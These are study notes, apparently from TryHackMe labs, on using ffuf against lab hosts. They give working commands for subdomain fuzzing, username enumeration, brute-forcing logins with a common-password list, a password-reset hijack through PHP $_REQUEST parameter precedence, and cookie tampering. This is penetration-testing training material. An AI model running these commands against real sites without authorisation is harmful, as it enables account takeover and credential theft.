#### ==**Find directories & hidden website pages**==

ffuf is a fest web fuzzer written in Go that allows typical directory discovery, virtual host discovery (without DNS records) and GET and POST parameter fuzzing.
# Useful Commands:

```bash
ffuf -w txtfile -u url
```

```bash
ffuf -u http://IP.PARAM -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.IP.PARAM' -fs 0
```

The above command uses the **-w** switch to specify the wordlist we are going to use. The **-H** switch adds/edits a header (in this instance, the Host header), we have the **FUZZ** keyword in the space where a subdomain would normally go, and this is where we will try all the options from the wordlist.  

Because the above command will always produce a valid result, we need to filter the output. We can do this by using the page size result with the **-fs** switch. Edit the below command replacing {size} with the most occurring size value from the previous result.  


This command has a similar syntax to the first apart from the **-fs** switch, which tells ffuf to ignore any results that are of the specified size.

```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://MACHINE_IP -fs {size}
```

This command is used to check usernames against any matches:

```bash
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.122.98/customers/signup -mr "username already exists"
```

|**Switch** | **Function** |  
| :-------:| :------:|
|-w|Selects the file's location on the computer that contains the list of usernames| 
|-X|Specifies the request method|
|-d|Specifies the data that we are going to send|
|-H|Add additional headers to the request|
|Content-Type|To tell the webserver we are sending form data|
|-u|Specifies the URL we are making the request to|
|-mr|The text on the page we are looking for to validate we've found a valid username|

Brute Forcing the found valid usernames:

```bash
ffuf -w names.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.122.98/customers/login -fc 200
```

The PHP `$_REQUEST` variable is an array that contains data received from the query string and POST data. If the same key name is used for both the query string and POST data, the application logic for this variable favours POST data fields rather than the query string, so if we add another parameter to the POST form, we can control where the password reset email gets delivered.

```bash
curl -X POST 'http://10.10.122.98/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={username}@customer.acmeitsupport.thm'
```

Mock cookie http request:

```bash
user@tryhackme$ curl -H "Cookie: logged_in=true; admin=false" http://10.10.122.98/cookie-test
```

and if server response encoded it might look like this:

`Set-Cookie: session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==; Max-Age=3600; Path=/`
